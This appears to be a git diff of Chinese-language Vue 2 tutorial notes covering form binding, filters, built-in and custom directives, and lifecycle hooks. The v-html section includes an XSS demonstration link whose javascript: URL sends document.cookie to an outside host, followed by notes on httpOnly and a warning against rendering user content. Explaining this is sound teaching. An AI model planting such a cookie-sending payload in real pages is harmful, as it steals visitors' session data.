@@ -3193,9 +3193,7 @@ react、Vue中的Key有什么用呢？
 </html>
 ```
 
-
-
-#### 1.12 收集表单数据
+### 1.12 收集表单数据
 
 ```html
 <!DOCTYPE html>
@@ -3208,6 +3206,20 @@ react、Vue中的Key有什么用呢？
 </head>
 <body>
     <div id="root">
+        	<!-- 
+			收集表单数据：
+					若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
+					若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+					若：<input type="checkbox"/>
+							1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+							2.配置input的value属性:
+									(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+									(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+					备注：v-model的三个修饰符：
+									lazy：失去焦点再收集数据
+									number：输入字符串转为有效的数字
+									trim：输入首尾空格过滤
+		-->
         <form @submit.prevent="submit">
                 <!-- v-model.trim ：数据去掉前后的空格  -->
             账号：<input type="text" name="username" v-model.trim="userInfo.userName"> <br/><br/>
@@ -3231,9 +3243,12 @@ react、Vue中的Key有什么用呢？
             </select>
             <br/><br/>
             其他信息
-            <textarea v-model="userInfo.other"></textarea><br/><br/>
+            <!-- 失去焦点再收集 -->
+            <textarea v-model.lazy="userInfo.other"></textarea><br/><br/>
             <input type="checkbox" v-model="userInfo.agree">
             阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
+            <br/>
+            <br/>
             <button>提交</button>
 
         </form>
@@ -3269,6 +3284,834 @@ react、Vue中的Key有什么用呢？
 ```
 
 
+
+>收集表单数据：
+>若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
+>若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+>若：<input type="checkbox"/>
+>1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+>2.配置input的value属性:
+>(1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+>(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+>备注：v-model的三个修饰符：
+>lazy：失去焦点再收集数据
+>number：输入字符串转为有效的数字
+>trim：输入首尾空格过滤
+
+### 1.13 过滤器调用
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-过滤器</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <script type="text/javascript" src="../js/dayjs.min.js"></script>
+</head>
+<body>
+		<!-- 
+			过滤器：
+				定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
+				语法：
+						1.注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+						2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
+				备注：
+						1.过滤器也可以接收额外参数、多个过滤器也可以串联
+						2.并没有改变原本的数据, 是产生新的对应的数据
+		-->
+    <div id="root">
+        <h2>显示格式化后的时间</h2>
+        <h3>原始的时间戳是：{{srcTime}}</h3>
+        <!-- 计算属性实现 -->
+        <h3>现在是:{{fmtTime}}</h3>
+        <!-- 使用methods实现 -->
+        <h3>现在是:{{getFmtTime()}}</h3>
+        <!-- 过滤器实现 -->
+        <h3>现在是:{{srcTime | timeFormat}}</h3>
+        <!-- 过滤器实现带参数 -->
+        <h3>现在是:{{srcTime | timeFormat('YYYY年MM月DD日 HH时mm分ss秒')}}</h3>
+        <h3 :x="msg | methodSlice">局部方法过滤调用</h3>
+        <h3 :x="msg | globeSlice">全局方法过滤调用</h3>
+    </div>
+
+    <div id="root2">
+
+    </div>
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        //全局过滤器
+        Vue.filter('globeSlice',function(value){
+            console.log('全局调用',value);
+            return value.slice(0,2);
+        });
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+                //使用Date.now()函数获取
+                srcTime: 1735957504953,
+                msg: '你好，nullnull,天塌了'
+            },
+            computed:{
+                fmtTime(){
+                    return dayjs(this.srcTime).format('YYYY年MM月DD日 HH:mm:ss');
+                }
+            },
+            methods: {
+                getFmtTime()
+                {
+                    return dayjs(this.srcTime).format('YYYY-MM-DD HH:mm:ss');
+                }                
+            }, 
+            filters:{
+                timeFormat(value,format='YYYY/MM/DD HH:mm:ss')
+                {
+                    return dayjs(this.srcTime).format(format); 
+                },
+                methodSlice(value)
+                {
+                    console.log('调用',value);
+                    return value.slice(0,3);
+                }
+            } 
+        });
+
+        const vm2 =new Vue({
+			el:'#root2',
+			data:{
+				msg:'hello,你又去浪了'
+			}
+		});
+    </script>
+</body>
+</html>
+```
+
+
+
+![image-20250104104238931](.\images\image-20250104104238931.png)
+
+
+
+### 1.14 指令
+
+#### 1.14.1 v-text指令
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-指令-text</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <script type="text/javascript" src="../js/dayjs.min.js"></script>
+</head>
+<body>
+
+    <div id="root">
+        <div>你好,{{name}}</div>
+        <div v-text="name">1</div>
+        <div v-text="str">2</div>
+    </div>
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               name: 'text-name',
+               str: '<h3>带html标签的文字</h3>'
+            }
+        });        
+    </script>
+</body>
+</html>
+```
+
+输出
+
+![image-20250104112634964](.\images\image-20250104112634964.png)
+
+
+
+#### 1.14.2 v-html指令
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-指令-v-html</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>你好,{{name}}</div>
+        <div v-html="str">1</div>
+        <div v-html="strHref">2</div>
+    </div>
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               name: 'text-name',
+               str: '<h3>带html标签的文字</h3>',
+               strHref: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>有惊喜哦！</a>'
+            }
+        });        
+    </script>
+</body>
+</html>
+```
+
+效果
+
+![image-20250104114914193](.\images\image-20250104114914193.png)
+
+![image-20250104114937247](.\images\image-20250104114937247.png)
+
+如果后端在响应的cookie 时没有设置httpOnly属性时，将会导致Cooke可以获取
+
+![image-20250104120137912](.\images\image-20250104120137912.png)
+
+![image-20250104120159887](.\images\image-20250104120159887.png)
+
+当设置httpOnly属性后,则浏览器通过documnet.cookie便获取不到了
+
+![image-20250104120318582](.\images\image-20250104120318582.png)
+
+   ![image-20250104120340943](.\images\image-20250104120340943.png)
+
+
+
+ v-html指令：
+
+​            1.作用：向指定节点中渲染包含html结构的内容。
+
+​            2.与插值语法的区别：
+
+​                  (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
+
+​                  (2).v-html可以识别html结构。
+
+​            3.严重注意：v-html有安全性问题！！！！
+
+​                  (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+
+​                  (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+
+
+
+#### 1.14.3 v-cloak指令
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-指令-v-cloak</title>    
+</head>
+<body>
+    <div id="root">
+       <h2>{{name}}</h2>
+       <!-- 当网速过慢时，此Vue.js会延迟加载5秒 -->
+       <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+    </div>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               name: '你好,nullnull'
+            }
+        });        
+    </script>
+
+</body>
+</html>
+```
+
+当未加载到vue.js时，就时出现
+
+![image-20250104130414191](.\images\image-20250104130414191.png)
+
+而当js加载完成后，页面才能正常显示
+
+![image-20250104130448557](.\images\image-20250104130448557.png)
+
+那如何解决在未加载到vue.js文件时，页面显示的这些模板占位符的问题？
+
+```html
+<!--添加v-cloak指令，并配合CSS样式-->
+<h2 v-cloak>{{name}}</h2>
+
+<!--添加CSS-->
+<style>
+    [v-cloak]{
+        display: none;
+    }
+</style>
+```
+
+那再打开页面就可以看到便是一片空白，而当页面加载到Vue后，v-cloak指令便会失效。页面即可正常加载。
+
+>v-cloak指令（没有值）：
+>1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+>2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+
+
+
+#### 1.14.4 v-once指令
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-指令-v-one</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    
+</head>
+<body>
+    
+    <div id="root">
+        <h2 v-once>当前的初始值是:{{num}}</h2>
+        <h2>当前的值是:{{num}}</h2>
+       <button @click="num++">点我加1</button>
+    </div>
+ 
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               num: 1
+            }
+        });        
+    </script>
+
+</body>
+</html>
+```
+
+输出：
+
+![image-20250104131355134](.\images\image-20250104131355134.png)
+
+总结：
+
+>v-once指令：
+>1.v-once所在节点在初次动态渲染后，就视为静态内容了。
+>2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+
+
+#### 1.14.5 v-pre指令
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-指令-v-pre</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+    
+</head>
+<body>
+    <div id="root">
+        <h2 v-pre>这就一个普通的内容，不用解析</h2>
+        <h2 v-pre v-once>当前的初始值是:{{num}}</h2>
+        <h2 v-pre>当前的值是:{{num}}</h2>
+    </div>
+ 
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               num: 1
+            }
+        });        
+    </script>
+
+</body>
+</html>
+```
+
+输出：
+
+![image-20250104132659291](.\images\image-20250104132659291.png)
+
+加上v-pre后，Vue便不再解析此标签中的内容
+
+v-pre指令：
+1.跳过其所在节点的编译过程。
+2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+
+
+
+### 1.15 自定义指令
+
+#### 1.15.1 简单片自定义指令
+
+定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-自定义指令</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2>{{name}}</h2>
+        <h2>当前的初始值是:<span v-text="num"></span></h2>
+        <!-- 自定义指令将num的放大10倍 -->
+        <h2>放大10倍后的值:<span v-big="num"></span></h2>
+    </div>
+ 
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               name: 'nullnull',
+               num: 1
+            },
+            directives:{
+                big(element,binging){
+                    console.log("element对象是",element instanceof HTMLElement);
+                    console.log("element对象是",binging);
+                    element.innerText = binging.value*10;
+                }
+            }
+        });        
+    </script>
+</body>
+</html>
+```
+
+输出：
+
+![image-20250104135812606](.\images\image-20250104135812606.png)
+
+>
+>
+>big函数何时会被调用？
+>
+>1.指令与元素成功绑定时（首次页面加载时）。
+>
+>2.指令所在的模板被重新解析时。
+>
+>
+
+#### 1.15.1 多单词定义
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-自定义指令</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <!-- 定义一个v-big-number指令，使用多单词 -->
+    <div id="root">
+        <h2>{{name}}</h2>
+        <h2>当前的初始值是:<span v-big-number="num"></span></h2>
+        <button @click="num++">点我加1</button>
+    </div>
+ 
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               name: 'nullnull',
+               num: 1
+            },
+            directives:{
+                'big-number':function(element,binging){
+                    element.innerText = binging.value*10;
+                }
+            }
+        });        
+    </script>
+</body>
+</html>
+```
+
+
+
+
+
+#### 1.15.2 回顾Dom操作
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>回顾Dom操作</title>
+    <style>
+        .backStyle{
+            background-color: blue;
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <button id="btn">点我创建一个输入框</button>
+    </div>
+ 
+    <script type="text/javascript">
+        const btn = document.getElementById('btn');
+        btn.onclick=()=>{
+            const input = document.createElement('input');
+            input.className = 'backStyle';
+            input.value = 99;
+
+            document.body.appendChild(input);
+            
+            //此设置到页面时，有时机的限制，必须将元素加入页面后，才能进行页面的显示操作
+            input.focus();
+            console.log(input.parentElement);
+        }
+
+    </script>
+</body>
+</html>
+```
+
+
+
+#### 1.15.3 完整的事件处理
+
+定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
+
+```html
+<!DOCTYPE html>
+<html>
+
+<body>
+
+    <head>
+        <meta charset="UTF-8" />
+        <title>VUE-自定义指令</title>
+        <script type="text/javascript" src="../js/vue.js"></script>
+    </head>
+
+    <body>
+        <!-- 需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 -->
+        <div id="root">
+            <h2>{{name}}</h2>
+            <h2>当前的初始值是:<span v-text="num"></span></h2>
+            <button @click="num++">点我加1</button>
+            <br />
+            <hr />
+            <input type="text" v-fbind:value="num">
+        </div>
+
+        <script type="text/javascript">
+            //阻止 vue 在启动时生成生产提示。
+            Vue.config.productionTip = false
+
+            //定义全局指令
+            Vue.directive('fbind',{
+                          //指令与元素成功绑定时（页面加载时）
+                          bind(element,binding){
+                              //注意，在所有的指令中，此处的this都是window对象
+                              console.log(this);
+                              element.value = binding.value;
+                          },
+                          //指令所在元素被插入页面时
+                          inserted(element,binding){
+                              //让当前的input框获得焦点
+                              element.focus();
+                          },
+                          //指令所在的模板被重新解析时
+                          update(element,binding){
+                              element.value = binding.value;
+                          }
+                      });
+            
+
+            const vm = new Vue({
+                el: '#root',
+                data: {
+                    name: 'nullnull',
+                    num: 1
+                },
+                directives: {
+                    //局部指令的写法
+                    /*   fbind:{
+                          //指令与元素成功绑定时（页面加载时）
+                          bind(element,binding){
+                              //注意，在所有的指令中，此处的this都是window对象
+                              console.log(this);
+                              element.value = binding.value;
+                          },
+                          //指令所在元素被插入页面时
+                          inserted(element,binding){
+                              //让当前的input框获得焦点
+                              element.focus();
+                          },
+                          //指令所在的模板被重新解析时
+                          update(element,binding){
+                              element.value = binding.value;
+                          }
+                      }  */
+                }
+            });        
+        </script>
+    </body>
+
+</html>
+```
+
+总结：
+
+>自定义指令总结：
+>一、定义语法：
+>(1).局部指令：
+>new Vue({															new Vue({
+>directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
+>}) 																		})
+>(2).全局指令：
+>Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)
+>
+>二、配置对象中常用的3个回调：
+>(1).bind：指令与元素成功绑定时调用。
+>(2).inserted：指令所在元素被插入页面时调用。
+>(3).update：指令所在模板结构被重新解析时调用。
+>
+>三、备注：
+>1.指令定义时不加v-，但使用时要加v-；
+>2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+
+
+
+### 1.16 生命周期
+
+![生命周期](.\images\生命周期.png)
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+    <meta charset="UTF-8"/>
+    <title>VUE-命令周期</title>
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h2>{{num}}</h2>
+        <button @click="add()">点我加1</button>
+        <button @click="bye()">点我销毁</button>
+    </div>
+ 
+    <script type="text/javascript">
+        //阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false 
+
+        const vm = new Vue({
+            el: '#root',
+            data:{
+               num: 1
+            },
+            methods: {
+                add(){
+                    console.log('add');
+                    this.num++;
+                },
+                bye(){
+                    console.log('bye');
+                    this.$destroy();
+                }
+            },
+            watch:{
+                num(){
+                    console.log('num变了');
+                } 
+            },
+            //在初始化之前，具体是在初始化数据监听、数据代理
+            //在beforeCreate无法通过vm访问到data中的数据、methods中的方法
+            beforeCreate() {
+                console.log('1,beforeCreate调用');
+                console.log('data中的this',this);
+                console.log('data中的_data还无法被访问',this._data);
+                //debugger;
+            },
+            //在初始化之后，具体是在初始化数据监听、数据代理
+            //在created方法中可以访问到data中的数据、methods中的方法
+            created(){
+                console.log('2,created调用');
+                console.log('data中的this',this);
+                console.log('data中的_data可以被访问',this._data);
+                //debugger;
+            },
+            //在将内存中的虚拟DOM转换为真实DOM插入页面之前
+            //1. 此时页面呈现未经Vue编译的DOM结构。
+            //2. 所有对DOM的操作，最终都不奏效
+            beforeMount(){
+                console.log('3,beforeMount调用');
+                console.log("显示显示未经过编译的DOM结构");
+                //在此处做任何的设置，结果都不奏效
+                document.querySelector('h2').innerText='不生效';
+                // debugger;
+            },
+            //在将内存中的虚拟DOM转换为真实DOM插入页面之后
+            //此时页面显示经过VUE编译的DOM
+            //对DOM的操作均有效，但需要尽量避免，到此初始化后
+            //一般在此进行开启定时器，发送网络请求，订阅消息，绑定自定义事件等初始化操作
+            mounted(){
+                console.log('4,mounted');
+                console.log('可以进行一些初始化操作');
+                //debugger;
+            },
+            //在将虚拟DOM更新到页面之前，
+            //数据是最新的，但页面是旧的，即页面尚未数据保持同步
+            beforeUpdate() {
+                console.log('5,beforeUpdate');
+                console.log('已经能够收到最新的值:'+this.num);
+                //debugger;
+            },
+            //在将虚拟DOM更新到页面之后，
+            //数据是最新的，但页面也是新的，即页面和数据保持同步
+            updated(){
+                console.log('6,updated');
+                console.log('页面和数据都完成更新');
+                //debugger;
+            },
+            //VM实例对象销毁之前，
+            //此时VM中所有的,data、methods、指令等待，都处于可用状态，马上要执行销毁过程
+            //一般在此阶段，关闭定时器、取消订阅消息、解绑自定义事件等收尾工作
+            //此处已经不在响应页面的变化。
+            beforeDestroy(){
+                console.log('7,beforeDestory');
+                console.log('销毁之前');
+                this.num = 12
+                //debugger;
+            },
+            //VM实例对象销毁之后
+            destroyed() {
+                console.log('8,destroyed');
+                console.log('销毁完毕之后');
+            }
+        });        
+    </script>
+</body>
+</html>
+```
+
+页面:
+
+![image-20250104180904811](.\images\image-20250104180904811.png)
+
+定时器的案例
+
+```html
+<!DOCTYPE html>
+<html>
+
+<body>
+
+    <head>
+        <meta charset="UTF-8" />
+        <title>VUE-案例</title>
+        <script type="text/javascript" src="../js/vue.js"></script>
+    </head>
+
+    <body>
+        <div id="root">
+            <!-- 当vue中的参数名与实例属性名一致时，可以使用此简写 -->
+            <h2 :style="{opacity}">用于设置透明度的文字</h2>
+            <button @click="opacity=1">透明度设置为1</button>
+            <button @click="stop">点我停止变换</button>
+        </div>
+
+        <script type="text/javascript">
+            //阻止 vue 在启动时生成生产提示。
+            Vue.config.productionTip = false
+
+            const vm = new Vue({
+                el: '#root',
+                data: {
+                    opacity: 1
+                },
+                methods: {
+                    stop() {
+                        this.$destroy();
+                    }
+                },
+                //VUE完成模板的解析并把真实的DOM元素放入页面后(挂载完毕)调用mounted
+                mounted() {
+                    console.log('mounted', this);
+                    this.stoptimer =  setInterval(() => {
+                        console.log('setInterval');
+                        this.opacity -= 0.01
+                        if (this.opacity <= 0) {
+                            this.opacity = 1;
+                        }
+                    },50);
+                },
+                //在停止前，清理定时器
+                beforeDestroy() {
+                    console.log('销毁前的停止动作');
+                    clearInterval(this.stoptimer);
+                },
+            });        
+        </script>
+    </body>
+
+</html>
+```
+
+显示
+
+![image-20250104182550913](.\images\image-20250104182550913.png)
+
+>常用的生命周期钩子：
+>1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
+>2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。
+>
+>关于销毁Vue实例
+>1.销毁后借助Vue开发者工具看不到任何信息。
+>2.销毁后自定义事件会失效，但原生DOM事件依然有效。
+>3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
+>
+>
 
 
 
